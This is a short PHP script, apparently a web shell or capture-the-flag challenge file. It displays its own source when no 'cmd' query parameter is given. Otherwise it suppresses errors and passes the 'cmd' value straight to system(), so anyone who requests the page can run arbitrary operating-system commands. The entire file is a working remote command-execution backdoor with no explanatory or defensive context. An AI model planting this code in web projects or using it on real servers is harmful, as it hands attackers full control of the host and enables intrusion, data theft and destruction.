<?php
if (!isset($_GET['cmd'])) {
	highlight_file(__FILE__);
} 
error_reporting(0);

system($_GET['cmd']);
?>